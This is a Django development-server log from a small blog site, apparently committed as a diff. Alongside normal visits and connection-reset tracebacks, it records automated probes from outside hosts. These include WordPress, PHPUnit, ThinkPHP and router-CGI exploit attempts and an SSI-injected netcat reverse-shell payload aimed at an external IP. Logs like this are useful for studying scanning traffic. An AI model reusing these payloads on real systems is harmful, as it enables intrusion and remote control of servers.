+[19/Jan/2021 05:26:18] code 400, message Bad request syntax ('º«d¡EZCÛM\x87î^ý¿\x159 XÔ>\x12\x98Ä<à\x13Ï\x00¬\xa09×\x90#8~\x8cÞ\x9dReF¿%1Qà\x9d\x06&g»\x82\x95\x19í\x07\x14\x19ZP\x80+\x94eÃæ\x85\x06¤\x99\x8b\x19l\x01ê\x88Y\x91\x16\x95ÄÈ\x0eH\x02Ç\x93gÁ4FW\x05|ûóT¸ýË»)ãÎÝÍ7\x9eïP\x8c¤[Vý\x98Él\x82õäÁd\x87X÷\x9b¿èq\x12\x99&Û,õ\x87×¨\x97j;ãê§´°\x02\xad\x8dE\x9bªB\x80\x0e)©é¯}\x18\x8e¸\x1e\x99\x04ï¨\x8cè\x04âÓí)1\x91Á\x8f\x88\x8c\x81ðÛ¥\x88\x95H\x9bZ«Î¿ôE%P*\x88KFY6\x9eç::jÔ\x8a¨V\x9aª«¯Ã&.í[\x04Åe\x7f\x08¾\x8ar§°\x99F÷\x11åÖ\x96\x8cIm+w\x1cýuU\x14\x0f!x¬èMPyÃ\x19!2\xa0íÀ}!Rw\x14\x8e\x1bÄá\xa0¯+\xadKkÅà\\s\x9c½Ë')
+[19/Jan/2021 05:26:18] "º«d¡EZCÛMî^ý¿9 XÔ>Ä<àÏ ¬ 9×#8~ÞReF¿%1Qà&g»íZP+eÃæ¤lêYÄÈHÇgÁ4FW|ûóT¸ýË»)ãÎÝÍ7ïP¤[VýÉlõäÁdX÷¿èq&Û,õ×¨j;ãê§´°­EªB)©é¯}¸ï¨èâÓí)1ÁðÛ¥HZ«Î¿ôE%P*KFY6ç::jÔ¨Vª«¯Ã&.í[Åe¾r§°F÷åÖIm+wýuU!x¬èMPyÃ!2 íÀ}!RwÄá ¯+­KkÅà\s½Ë" 400 -
+[19/Jan/2021 06:00:58] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('41.60.219.28', 15606)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 06:05:47] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 06:45:37] "GET / HTTP/1.1" 200 1753
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 06:45:37] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 06:45:38] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 06:45:38] "GET / HTTP/1.1" 200 1753
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 06:45:39] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 06:45:40] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 06:45:42] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 06:45:43] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 06:45:43] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /GponForm/diag_Form
+[19/Jan/2021 06:51:41] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2273
+----------------------------------------
+Exception happened during processing of request from ('115.56.187.138', 36727)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[19/Jan/2021 07:04:49] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2365
+Not Found: /api/jsonws/invoke
+[19/Jan/2021 07:04:49] "POST /api/jsonws/invoke HTTP/1.1" 404 2267
+Not Found: /solr/admin/info/system
+[19/Jan/2021 07:04:50] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2289
+Not Found: /index.php
+[19/Jan/2021 07:04:50] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2361
+[19/Jan/2021 07:04:51] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 1753
+[19/Jan/2021 07:04:51] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1753
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[19/Jan/2021 07:04:52] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2350
+Not Found: /console/
+[19/Jan/2021 07:04:52] "GET /console/ HTTP/1.1" 404 2239
+Not Found: /Autodiscover/Autodiscover.xml
+[19/Jan/2021 07:04:52] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2303
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[19/Jan/2021 07:04:52] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2366
+[19/Jan/2021 07:16:11] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 07:48:08] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 08:15:31] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 08:23:17] "GET / HTTP/1.1" 200 1753
+Not Found: /login
+[19/Jan/2021 08:36:28] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[19/Jan/2021 08:36:28] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[19/Jan/2021 08:36:29] "GET /manager/html HTTP/1.0" 404 2247
+Not Found: /config/getuser
+[19/Jan/2021 08:40:28] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[19/Jan/2021 08:40:49] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 09:31:40] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 09:47:21] code 400, message Bad request syntax ('\x05\x01\x00')
+[19/Jan/2021 09:47:21] " " 400 -
+[19/Jan/2021 09:47:26] code 400, message Bad request syntax ('\x05\x01\x00')
+[19/Jan/2021 09:47:26] " " 400 -
+[19/Jan/2021 09:47:31] code 400, message Bad request syntax ('\x05\x01\x00')
+[19/Jan/2021 09:47:31] " " 400 -
+[19/Jan/2021 09:49:00] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[19/Jan/2021 09:49:00] " P¼Òã " 400 -
+[19/Jan/2021 09:49:05] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[19/Jan/2021 09:49:05] " P¼Òã " 400 -
+[19/Jan/2021 09:49:11] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[19/Jan/2021 09:49:11] " P¼Òã " 400 -
+Not Found: /http:/5.188.210.227/echo.php
+[19/Jan/2021 09:50:06] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 1697
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.56', 35116)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 10:13:07] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.56', 33788)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 10:13:08] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 10:19:35] "HEAD / HTTP/1.1" 200 1753
+[19/Jan/2021 11:16:55] "GET / HTTP/1.1" 200 1753
+Not Found: /incl/image_test.shtml
+[19/Jan/2021 14:45:03] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/p;nc%20-w%205%2089.248.170.31%209772%200%3C/tmp/p|/bin/sh%3E/tmp/p%202%3E/tmp/p;rm%20/tmp/p%22%20--%3e HTTP/1.0" 404 2425
+[19/Jan/2021 14:59:26] "GET / HTTP/1.0" 200 1753
+[19/Jan/2021 15:00:03] "GET /auth/signup HTTP/1.1" 200 5243
+[19/Jan/2021 15:00:03] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 15:00:03] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 15:00:03] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[19/Jan/2021 15:00:03] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 15:00:03] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 15:00:04] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 15:00:44] "POST /auth/signup HTTP/1.1" 302 0
+[19/Jan/2021 15:00:44] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 15:00:44] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[19/Jan/2021 15:00:51] "POST /auth/login HTTP/1.1" 302 0
+[19/Jan/2021 15:00:51] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:00:55] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:00:56] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:00:57] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:00:59] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:01:00] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:01:01] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:01:02] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:01:02] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 15:01:03] "GET / HTTP/1.1" 200 1752
+[19/Jan/2021 16:14:16] "GET / HTTP/1.1" 200 1753
+Not Found: /cgi-bin-igd/netcore_set.cgi
+[19/Jan/2021 16:23:41] "POST /cgi-bin-igd/netcore_set.cgi HTTP/1.1" 404 2297
+[19/Jan/2021 16:36:15] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 17:04:11] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 17:23:55] "GET / HTTP/1.1" 200 1753
+Not Found: /robots.txt
+[19/Jan/2021 17:23:58] "GET /robots.txt HTTP/1.1" 404 2242
+Not Found: /sitemap.xml
+[19/Jan/2021 17:23:58] "GET /sitemap.xml HTTP/1.1" 404 2245
+----------------------------------------
+Exception happened during processing of request from ('185.142.236.35', 40450)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /.well-known/security.txt
+[19/Jan/2021 17:24:00] "GET /.well-known/security.txt HTTP/1.1" 404 2284
+----------------------------------------
+Exception happened during processing of request from ('185.142.236.35', 41170)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 17:24:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+----------------------------------------
+Exception happened during processing of request from ('185.142.236.35', 39842)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 17:27:17] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 17:31:59] "GET / HTTP/1.1" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('87.27.220.7', 41448)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 18:29:46] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 18:29:47] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[19/Jan/2021 18:29:47] "GET /static/css/blog_base_total.css HTTP/1.1" 304 0
+[19/Jan/2021 18:29:47] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[19/Jan/2021 18:29:47] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[19/Jan/2021 18:32:24] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 18:32:25] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 19:06:07] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 20:10:50] "GET /auth/login HTTP/1.1" 200 2473
+[19/Jan/2021 20:10:50] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[19/Jan/2021 20:13:46] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 20:14:31] "GET / HTTP/1.1" 200 1753
+[19/Jan/2021 20:17:22] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:17:22] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 20:17:22] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:17:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 20:18:03] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:44] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:45] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:45] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:47] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:47] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 20:19:47] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 20:19:47] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 20:19:47] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 20:19:51] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:53] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:53] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 20:19:53] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 20:19:53] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 20:19:53] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 20:19:58] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:59] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:19:59] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 20:19:59] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 20:19:59] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 20:19:59] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 20:20:07] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:20:07] "GET / HTTP/1.1" 200 1920
+Not Found: /robots.txt
+[19/Jan/2021 20:21:55] "GET /robots.txt HTTP/1.1" 404 2241
+[19/Jan/2021 20:21:58] "GET / HTTP/1.1" 200 1920
+[19/Jan/2021 20:23:06] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 20:23:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 20:23:32] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 20:23:33] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 20:23:33] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 20:23:33] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 20:23:33] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 20:23:37] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 20:23:42] "GET /auth/signup HTTP/1.1" 200 5517
+[19/Jan/2021 20:23:45] "GET /auth/login HTTP/1.1" 200 2747
+[19/Jan/2021 20:30:36] "GET / HTTP/1.1" 200 2027
+----------------------------------------
+Exception happened during processing of request from ('117.28.120.176', 56682)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 20:59:24] "HEAD / HTTP/1.0" 200 2027
+[19/Jan/2021 21:03:05] "GET / HTTP/1.1" 200 2027
+----------------------------------------
+Exception happened during processing of request from ('188.240.223.167', 33176)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[19/Jan/2021 21:21:50] "GET /robots.txt HTTP/1.1" 404 2241
+[19/Jan/2021 21:22:01] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 21:22:22] "GET /auth/login HTTP/1.1" 200 2747
+[19/Jan/2021 21:22:33] "GET /auth/signup HTTP/1.1" 200 5517
+[19/Jan/2021 21:22:44] "GET /auth/signup HTTP/1.1" 200 5517
+[19/Jan/2021 21:32:29] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 21:32:30] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:30] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 21:32:31] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 21:32:31] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:31] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:32] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:32] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:33] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:33] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:34] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:34] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:34] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:35] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:35] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:36] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:32:36] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[19/Jan/2021 21:41:43] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 21:41:43] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:44] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[19/Jan/2021 21:41:44] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[19/Jan/2021 21:41:44] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:45] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:45] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:46] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:46] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:46] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:47] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:47] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:48] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:48] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:49] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:49] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:49] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:50] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:50] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:51] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[19/Jan/2021 21:41:51] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cgi-bin/mainfunction.cgi
+[19/Jan/2021 21:53:59] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 2280
+[19/Jan/2021 21:58:43] "GET / HTTP/1.1" 200 2027
+Not Found: /robots.txt
+[19/Jan/2021 21:58:44] "GET /robots.txt HTTP/1.1" 404 2242
+Not Found: /sitemap.xml
+[19/Jan/2021 21:58:44] "GET /sitemap.xml HTTP/1.1" 404 2245
+----------------------------------------
+Exception happened during processing of request from ('198.20.69.98', 34484)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
